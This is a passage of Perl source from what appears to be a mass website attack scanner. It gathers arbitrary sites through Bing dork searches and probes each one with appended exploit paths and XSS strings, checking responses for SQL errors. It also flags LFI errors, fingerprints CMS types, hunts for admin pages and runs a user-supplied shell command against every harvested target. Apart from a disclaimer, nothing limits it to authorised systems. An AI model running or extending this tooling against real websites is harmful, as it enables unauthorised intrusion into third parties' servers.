	  print "\033[0;31m[!] Rename your list [$exploit] I use the same name!\n";
	  exit();
    }
	use File::Copy qw(copy);
	copy $exploit, $Bin.'/exploits.txt';
  }else{
    if ($exploit =~ m/$pat2/) {
	  $exploit =~ s/$pat2//g;
      $exploit =~ s/ /+/g;

    }elsif ($exploit =~ m/$pat3/) {
      $exploit =~ s/$pat3/ /g;
    }elsif ($exploit =~ m/ /) {
      $exploit =~ s/ /+/g;
    }
    my @exploits = split / /, $exploit;
    foreach my $exploit (@exploits) {
      open (FILE, '>'.$Bin.'/exploits.txt');
      print FILE "$exploit\n";
      close (FILE);
	}
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK TARGET URL OR IP
sub checkurltype{
  $URL=$_[0];
  if ($URL=~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
	print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
    print "\033[0;31m[!] $URL is an IP [Use: -t <ip> --level 20 <opcion>]! \n";
    exit();
  }else{
    return $URL;
  }
}	
############################################################################################################################################################################################
############################################################################################################################################################################################
## VALIDATE IP
sub checkip{
  $URL=$_[0];
  if ($URL!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
	print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
    print "\033[0;31m[!] $URL is an IP [Use: -t <ip> --level 20 <opcion>]! \n";
    exit();
  }else{
    return $URL;
  }
}	
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT DORKS IN LIST
sub countdorks {
  my $lc = 0;
  my $file = $dork;
  if (!-e $dork) {
	print "\033[1;37m\n\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
	print "\033[0;31m[!] Dont make me crazy! NO $dork found!\n";
	exit();
  }
  open $file, "<", $dork;
  $lc++ while <$file>;
  print "\033[0;36m[$lc Dorks(s) Found in the List!]\n";
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub countdorkslist {
  my $lc = 0;
  my $file = $Bin."/dorks.txt";
  open $file, "<", $file;
  $lc++ while <$file>;
  print "$lc";
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub countpasswordlist {
  my $lcpass = 0;
  my $file = $password;
  if (!-e $password) {
	print "\033[1;37m\n\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
	print "\033[0;31m[!] NO $password list found!\n";
	exit();
  }
  open $file, "<", $file;
  $lcpass++ while <$file>;
  print "$lcpass Password(s) found in list";
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT TARGETS IN LIST
sub countinicialtargets {
  my $lc = 0;
  my $file = $Target;
  if (!-e $Target) {
	print "\033[1;37m\n\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
	print "\033[0;31m[!] Dont make me crazy! NO $Target found!\n";
	exit();
  }
  open $file, "<", $Target;
  $lc++ while <$file>;
  print "\033[0;36m[$lc Target(s) Found in the List!]";
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT TARGETS TO SQLMAP IN LIST
sub countsqllist {
  my $lc = 0;
  my $file = $Bin."/xss_scan.txt";
  open $file, "<", $file;
  $lc++ while <$file>;
  print "$lc"; 
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT SERACH ENGINE RESULTS
sub countsearchlist {
  my $lc = 0;
  my $file = $Bin."/search.txt";
  open $file, "<", $file;
  $lc++ while <$file>;
  print "$lc"; 
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT EXPLOITS LIST
sub countexploits {
  my $lc = 0;
  my $file = $Bin."/exploits.txt";
  open $file, "<", $file;
  $lc++ while <$file>;
  print "$lc"; 
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## VERIFY TARGETS FOR EXPLOITATION
sub control {
  $URL=$_[0];
  if (defined $mdom) {
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
  }
  if ((defined $replace) && (defined $with)) {
	 if (index($URL, $replace) != -1) {
	    $URL =~ s/$replace/$with/ig;
	 }
  }
  if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
  return $URL;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## EXTRAT INFO PROCESS SCAN
sub checkextrainfo {
  my $checkip=$URL1;
  $req = HTTP::Request->new('GET', $checkip);
  my $re = $ua->request($req);
  my $st = $re->code;

  print "\033[1;37m    IP:     ";
  if ($st==200) {
    if (index($checkip, 'http://') != -1) {
	  $checkip =~ s/http:\/\///g;
    }elsif (index($checkip, 'https://') != -1) {
	  $checkip =~ s/https:\/\///g;
    }
    $checkip=~ s/\/.*//s;
    use Socket;
    my $ip = Socket::inet_ntoa(inet_aton($checkip));
	if (defined $ip) {
      print "\033[0;37m$ip\n";
	}else{
      print "\033[0;37mUndefined!\n";
	}
  }else{
    print "\033[0;37mUndefined!\n";
  }
  if ((defined $replace) && (defined $with)) {
	print "\033[1;37m    REPLC:  ";
	print "\033[0;37m[$replace] => [$with]\n";
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN PROCEDURE
sub checkedurl {
  $request = HTTP::Request->new('GET', $URL1);
  my $response = $ua->request($request);
  my $html = $response->content;
  my $status = $response->code;
  my $serverheader = $response->server;
  my $httpd = $response->headers_as_string;
  
  if (!defined $noinfo) {
    checkextrainfo();
    if($URL1 !~ /http:\/\//) { $URL1 = "http://$URL1"; };	
    print "\033[1;37m    HTTP:   ";
    print "\033[0;37mHTTP/1.1 $status\n";

    print "\033[1;37m    SERVER: ";
    if (defined $serverheader) {
      print "\033[0;37m$serverheader \n";
    }else{
	  print "\033[0;37mUndefined\n";
    } 
    for my $ERROR (@ERROR) {
	  if ( $html =~ /$ERROR/ ){
	    $ERROR1=$ERROR;
	    checkerrortype();
	  }
    }
    for my $MODULETYPE (@MODULETYPE) {
	  if ( $html =~ /$MODULETYPE/ ){
	    $MODULETYPE1=$MODULETYPE;
	    checkcmstype();
	  }
    }
  }
  print "\033[1;37m    SCAN:   ";  
  if (($html =~ /$yes/) && ($html !~ /$no/)) {
    if ((defined $validation_text) || (defined $mxss) || (defined $mlfi) || (defined $mjoomrfi) || (defined $mwpadf)) {
	  print "\033[0;32m$URL1 \n";
      open (LOS, '>>', $Bin.'/scan.txt');
      print LOS "$URL1\n";
	  close (LOS);
	}else{
	  if ($response->is_success) {
        if ($response->previous) {
	      print "\033[0;31mNo Results Found! \n";
	    }else{
          if (defined $beep) {print chr(7);}
	      if (defined $cms) {
            print "\033[0;32m$cms\n";
	      }elsif (defined $cmails) {
            print "\033[0;32m$1\n";
	      }else{
            print "\033[0;32m$URL1\n";
	      }
          open (INFO, '>>', $Bin.'/scan.txt');
	      if (defined $cmails) {
            print INFO "$1\n";
	      }else{
            print INFO "$URL1\n";
	      }
          close (INFO);
	      if (defined $cmails){
            open (LOG, '>>', $Bin.'/scan2.txt');
            print LOG "$URL1\n   $1\n";
		    close (LOG);
	      }	
	    }
	  }
	}
  }else{
	print "\033[0;31mNo Results Found! \n";
  }
  print "\033[0;37m    ....................................................................... \n";
  $urlstatus = $status;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub urlstatus {
  if ($urlstatus==200) {
	print "\033[0;33m[!] Possible Admin page found! Do you want to continue scan? [Y/n]: ";
    $resp=<STDIN>;
    chomp ($resp);
	my $yes ='Y|y|yes|YES|Yes';
    if ($resp !~ /$yes/) {
	  fincontinuemodule();
      if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/admin_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
	    print "\033[0;32m[!] Results saved in $save!\n";
	  }
      print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
	  subfin(); 
	  unlink $Bin.'/scan.txt';
	  unlink $Bin.'/search.txt';
	  unlink $Bin.'/dorks.txt';
	  exit();
	}
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK ERRORS
sub checkerrortype { 
  print "\033[1;37m    ERROR:  ";
    for my $ERROR (@ERROR) {
  	if ($ERROR1 eq $ERROR){
	  if (defined $beep) {print chr(7);}
      if ($ERROR eq $ERROR[0]){
	    print "\033[0;33mPossible Lfi Vulnerability!\n";
      }else{
	    print "\033[0;33m$ERROR\n";
	  }
	}  
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## DELETE SEARCH + EXPLOITS LIST
sub deleteqexp { 
  unlink $Bin.'/search.txt';
  unlink $Bin.'/exploits.txt';
}	  	
############################################################################################################################################################################################
############################################################################################################################################################################################
## DEFINE CMS DETECTION
sub checkcmstype {
  print "\033[1;37m    CMS:    ";
    for my $MODULETYPE (@MODULETYPE) {
  	if ($MODULETYPE1 eq $MODULETYPE){
	  if (defined $beep) {print chr(7);}
      if ($MODULETYPE eq $MODULETYPE[0]){ print "\033[0;33mWordPress\n";
      }elsif ($MODULETYPE eq $MODULETYPE[1]){ print "\033[0;33mJoomla\n";
      }elsif ($MODULETYPE eq $MODULETYPE[2]){ print "\033[0;33mTextpattern\n";
      }elsif ($MODULETYPE eq $MODULETYPE[3]){ print "\033[0;33mSMF\n";
      }elsif ($MODULETYPE eq $MODULETYPE[4]){ print "\033[0;33mphpBB\n";
      }elsif (($MODULETYPE eq $MODULETYPE[5]) || ($MODULETYPE eq $MODULETYPE[6])){ print "\033[0;33mvBulletin\n";
      }elsif ($MODULETYPE eq $MODULETYPE[7]){ print "\033[0;33mMyBB\n";
      }elsif (($MODULETYPE eq $MODULETYPE[8]) || ($MODULETYPE eq $MODULETYPE[9])) { print "\033[0;33mCloudFlare\n";
      }elsif ($MODULETYPE eq $MODULETYPE[10]){ print "\033[0;33mDrupal\n";
      }elsif ($MODULETYPE eq $MODULETYPE[11]){ print "\033[0;33mPostNuke\n";
      }elsif ($MODULETYPE eq $MODULETYPE[12]){ print "\033[0;33mATutor\n";
      }elsif ($MODULETYPE eq $MODULETYPE[13]){ print "\033[0;33mPHP-Nuke\n";
      }elsif (($MODULETYPE eq $MODULETYPE[14]) || ($MODULETYPE eq $MODULETYPE[15])){ print "\033[0;33mMoodle\n";
      }elsif ($MODULETYPE eq $MODULETYPE[16]){ print "\033[0;33mAdaptCMS\n";
      }elsif ($MODULETYPE eq $MODULETYPE[17]){ print "\033[0;33mSilverStripe\n";
      }elsif ($MODULETYPE eq $MODULETYPE[18]){ print "\033[0;33mMODx\n";
      }elsif ($MODULETYPE eq $MODULETYPE[19]){ print "\033[0;33mXOOPS\n";
      }elsif (($MODULETYPE eq $MODULETYPE[20]) || ($MODULETYPE eq $MODULETYPE[21])) { print "\033[0;33mOsCommerce\n";
      }elsif (($MODULETYPE eq $MODULETYPE[22]) || ($MODULETYPE eq $MODULETYPE[23])) { print "\033[0;33mPrestaShop\n";
      }elsif ($MODULETYPE eq $MODULETYPE[24]){ print "\033[0;33mb2evolution\n";
      }elsif (($MODULETYPE eq $MODULETYPE[25]) || ($MODULETYPE eq $MODULETYPE[26])) { print "\033[0;33mMagento\n";
      }elsif (($MODULETYPE eq $MODULETYPE[27]) || ($MODULETYPE eq $MODULETYPE[28])) { print "\033[0;33mZen Cart\n";
      }elsif (($MODULETYPE eq $MODULETYPE[29]) || ($MODULETYPE eq $MODULETYPE[30])) { print "\033[0;33mConcrete5\n";
      }elsif ($MODULETYPE eq $MODULETYPE[31]){ print "\033[0;33mOpenCart\n";}
	}
  }	 
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## END COUNT SCAN RESULTS
sub fincontinuemodule {
  my $lc = 0;
  open $file, "<", $Bin."/scan.txt";
  $lc++ while <$file>;
  print "\033[0;32m[!] $lc Target(s) Found!\n";
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## NEGATIVE SCAN AND EXIT
sub negativeexit {
  negative2();
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## RETURN NEGATIVE SCAN
sub negative {
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  print "\033[0;31m[!] No Results Found!\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## RETURN NEGATIVE SCAN2
sub negative2 {	
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  print "\033[0;31m[!] No Results Found!\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## END SCAN PROCESS
sub subfin {
  print "\033[0;31m[!] ";
  timer();
  print "SCAN FINISHED!\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK TARGETS LIST
sub searchexitstargets {
  if (!-e $Bin.'/search.txt'){
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
    print "\033[0;33m[!] No Target list found!\n";
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## DESCLAIMER
sub desclaimer {
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  print "\033[1;37m[ ]";
  print "\033[0;37m --------------------------------------------------------------------- ";
  print "\033[1;37m[ ]\n";
  print "\033[1;37m[ ]";
  print "\033[0;37m This is a pentest tool! We will not be responsible or liable directly ";  
  print "\033[1;37m[ ]\n";
  print "\033[1;37m[ ]";    
  print "\033[0;37m      or indirectly in any way for any loss or damage of any kind      ";
  print "\033[1;37m[ ]\n";
  print "\033[1;37m[ ]"; 
  print "\033[0;37m              incurred as result of our program use !!                 ";               
  print "\033[1;37m[ ]\n";
  print "\033[1;37m[ ]";
  print "\033[0;37m --------------------------------------------------------------------- ";
  print "\033[1;37m[ ]\n";
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  osinfo();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SEARCH ENGINE
sub submsearch {
  testconection();
  $checksearchscanlist = $Bin."/search.txt";
  if (-e $checksearchscanlist){ unlink $checksearchscanlist};
  dorklist();
  msearch();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ENGINE PROCEDURE
sub msearch {
  $browserlang = $browserlangs[int rand @browserlangs];
  scandetail();
  print "\033[1;33m[+] RANDOM SEARCH:: ";
    print "\033[0;36mBING [bing.". $browserlang . "] ";
  if (defined $unique) {
    print "\033[0;36m[Unique Results]";
  }
  if (defined $ifinurl) {
    print "\033[0;36m[Ifinurl VLD]";
  }
  print "\n";   
  if (defined $dork) {
    $printdork = $dork;
	$printdork =~ s/\+/ /g;
    print "\033[1;33m[+] SEARCH:: ";
    print "\033[0;36m[$printdork] ";
    my $pattern = '.txt';
	if ($dork =~ m/$pattern/i){
	  countdorks();
	}else{
      print "\n";
	}
  }
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING ENGINE SCAN ... \n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (FILE, $Bin."/dorks.txt");
  while (my $dork = <FILE>) {
    chomp $dork;
	$count++;
	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
      print "\033[1;36m\n[!] ";
	  timer();
	  print "[Dork $count/";
	  countdorkslist();
      $printdork = $dork;
	  $printdork =~ s/\+/ /g;
	  print "\033[1;36m] ";
	  print "[SCAN:: $printdork]\n";
      print "\033[1;37m[ ] ....................................................................... \n";
    }
	$mlevel = $mlevel;
    $s_results = $dork;
	if ((defined $Target) || (defined $rangip)) {
      $s_results = "ip%3A".$dork;
      $s_results =~ s/ //g;
	}
    my @scanlist=&scan($s_results);
    sub scan(){
      my @search;
	  $count2=0;
      for($npages=0;$npages<=$mlevel;$npages+=10){
        my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages."&FORM=PERE&cc=".$browserlang);
		my $search=$ua->get("$google");
        $search->as_string;
        my $Res=$search->content;
        while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)/g){
          if($1 !~ /msn|live|bing|cookieSet|security|youtube.com|0day|exploit|pastebin|microsoft|WindowsLiveTranslator|google|cache|74.125.153.132|inurl:|q=|404|403|Network|Failed|adw.sapo|tripadvisor|yandex/){
            if (defined $unique) {
		      $check=$s_results;
	        }elsif (defined $ifinurl) {
		      $check=$ifinurl;
	        }else{
		      $check='.';
		    }
           	if (index($1, $check) != -1) {
			  my $URL=$1;
			  use HTML::Entities;
			  $URL = decode_entities($URL);

			  if ((defined $msites) || (defined $mdom)) {
			    if (index($URL, 'http://') != -1) {
	              $URL =~ s/http:\/\///g;
	            }
                $URL=~s/\/.*//s;
			    if ($URL !~ /http:\/\//) { $URL = "http://$URL"; };
			  }
			  if ($repeat{$URL}) {
			  }else{
			    $count2++;
			    if ($URL !~ /http:\/\//) { $URL = "http://$URL"; };			 
	            if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	              print "\033[1;33m    ";
	              timer();
	              print "[Target $count2]\n";
	              print "\033[1;37m    TARGET: ";
	              print "\033[0;37m$URL\n";
	              $URL1=$URL;
                  if (!defined $noinfo) {
                     checkextrainfo();
				     $request = HTTP::Request->new('GET', $URL);
                     my $response = $ua->request($request);
                     my $html = $response->content;
                     my $status = $response->code;
					 my $serverheader = $response->server;
 	                 print "\033[1;37m    HTTP:   ";
	                 print "\033[0;37mHTTP/1.1 $status\n";
                     print "\033[1;37m    SERVER: ";
                     if (defined $serverheader) {
                       print "\033[0;37m$serverheader\n";
                     }else{
	                   print "\033[0;37mUndefined\n";
                     }
                     for my $ERROR (@ERROR) {
	                   if ( $html =~ /$ERROR/ ){
	                     $ERROR1=$ERROR;
	                     checkerrortype();
	                   }
                     }
                     for my $MODULETYPE (@MODULETYPE) {
	                   if ( $html =~ /$MODULETYPE/ ){
	                     $MODULETYPE1=$MODULETYPE;
	                     checkcmstype();
				       }
                     }		          
                  }
			      print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
			    }
                open (TEXT, '>>', $Bin.'/search.txt');
			    print TEXT "$URL\n";
                close (TEXT);
			    $repeat{$URL}++;
			  }
			}
          }
		}
      }
    }   
  }
  $list = $Bin."/search.txt";
  if (-e $list){
    my $lc = 0;
	my $file = $Bin."/search.txt";
    my %seen = ();
    {
      local @ARGV = ($file);
      local $^I = '.bac';
      while(<>){
        $seen{$_}++;
        next if $seen{$_} > 1;
        print;
        close (TEXT);
		unlink $Bin."/search.txt.bac";
      }
    }
    open $file, "<", $Bin."/search.txt";
    $lc++ while <$file>;
	print "\033[0;32m[!] $lc Unique Result(s) Found!\n";
	close $file;
	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin."/search.txt";
		$save = "$outdir/search.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
        print "\033[0;32m[!] Results saved in $save\n";
	  }
	  unlink $Bin.'/search.txt';
      subfin();
    }else{
	  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt'};
	}
  }else{
    negative();
	exit();
  }
  unlink $Bin.'/dorks.txt';
} ## end sub msearch
############################################################################################################################################################################################
############################################################################################################################################################################################
## VALIDATION IF STATUS 200
sub misup {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  if (-e $Bin.'/validated.txt'){ unlink $Bin.'/validated.txt';}
  testconection();
  if (!defined $mlevel){
    targetlist();
  }
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING HTTP VALIDATION SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	$URL = control($URL);
	$yes='a';
    $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	if (defined $exploit) {
      $count3=0;  
      open (EXP, $Bin.'/exploits.txt');
      while (my $exp = <EXP>) {
		$count3++;
	    chomp $exp;
        print "\033[1;36m    ";
	    timer();
	    print "[Exp $count3/";
	    countexploits();
	    print "\033[1;36m]\n";
	    print "\033[1;37m    EXPLT:  ";
	    print "\033[0;37m$exp\n";
        $URL1 = $URL.$exp;
        $URL1 =~ s/ //g;
        checkedurl();
      }
      close (EXP);
    }else{
      $URL1 = $URL;
      $URL1 =~ s/ //g;
      checkedurl();
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
	unlink $Bin.'/search.txt';
    if ((!defined $validation_text) && (!defined $command) && (!defined $mxss) && (!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/search.txt";
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  deleteqexp();
	}else{
      use File::Copy qw(copy);
	  copy $Bin.'/scan.txt', $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
  }else{
	negatif();
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## VALIDATION BY TEXT
sub mvalidation {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  if (-e $Bin.'/validated.txt'){ unlink $Bin.'/validated.txt';}
  testconection();
  if ((!defined $mlevel) && (!defined $misup)) {
    targetlist();
  }
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING VALIDATION SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
	chomp $URL;
    $count++;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
    print "\033[1;37m    TARGET: ";
    print "\033[0;37m$printarget\n";
	$URL = control($URL);	
    $yes = $validation_text;
    $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
    if (defined $exploit) {
      $count3=0;
      open (EXP, $Bin.'/exploits.txt');
      while (my $exp = <EXP>) {
		$count3++;
	    chomp $exp;
        print "\033[1;36m    ";
	    timer();
	    print "[Exp $count3/";
	    countexploits();
	    print "\033[1;36m]\n";
	    print "\033[1;37m    EXPLT:  ";
	    print "\033[0;37m$exp\n";
        $URL1 = $URL.$exp;
        $URL1 =~ s/ //g;
        checkedurl();
      }
      close (EXP);
    }else{
      $URL1 = $URL;
      $URL1 =~ s/ //g;
      checkedurl();
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
	unlink $Bin.'/search.txt';
    if ((!defined $command) && (!defined $mxss) && (!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/search.txt";
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  deleteqexp();
	}else{
      use File::Copy qw(copy);
	  copy $Bin.'/scan.txt', $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COMMAND
sub mcommand {
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING EXTERNAL COMMAND SUBPROCESS...\n";
  print "\033[1;37m[ ]-----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$URL \n";
	if (!defined $noinfo) {
      $URL1=$URL;
      checkextrainfo();
	}
	if ((!defined $misup) && (!defined $validation_text)) {
      $URL = control($URL);
	}
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
	if (defined $command) {
	  $command =~ s/--TARGET//g;
	}
	if (defined $exploit) {
      $count3=0;  
      open (EXP, $Bin.'/exploits.txt');
      while (my $exp = <EXP>) {
		$count3++;
	    chomp $exp;
        print "\033[1;36m    ";
	    timer();
	    print "[Exp $count3/";
	    countexploits();
	    print "\033[1;36m]\n";
	    print "\033[1;37m    EXPLT:  ";
	    print "\033[0;37m$exp\n";
        $URL = $URL.$exp;
        $cod = "$command $URL";
	    print "\033[1;37m    CMD:    ";
        print "\033[0;37m$cod \n\n";
        system($cod);
	  }
    }else{
      $cod = "$command $URL";
	  print "\033[1;37m    CMD:    ";
      print "$cod \n\n";
      system($cod);
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  subfin();
  if ((!defined $mxss) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
    unlink $Bin.'/exploits.txt';
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## XSS
sub mxss {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  XSS();
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING XSS SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";
	if ((!defined $misup) && (!defined $validation_text)) {
      $URL = control($URL);
	}
	foreach $XSS(@XSS){
	  $URL =~ s/ //g;
      $yes = 'MySQL|syntax|SQL|mysql_fetch_assoc|num_rows|ORA-01756|PostgreSQL|internal server error|You have an error in your SQL syntax';
      $no = '404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
	  if (defined $exploit) {
        $count3=0;
        open (EXP, $Bin.'/exploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[1;36m    ";
	      timer();
	      print "[Exp $count3/";
	      countexploits();
	      print "\033[1;36m]\n";
	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          $URL1 = $URL.$exp.$XSS;
          checkedurl();
        }
        close (EXP);
      }elsif (defined $p) {
		if ($URL =~ /$p=([^&]*)/) {
		  $URL =~ s/$p=([^&]*)/$p=$1$XSS/g;
          $URL1 = $URL; 
		  checkedurl();
		}else{
		  print "    \033[1;37mSCAN:   ";   
	      print "\033[0;31mNo Parameter [$p] Found!\n";
		}
      }else{
        $URL1 = $URL.$XSS;
        checkedurl();
      }
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
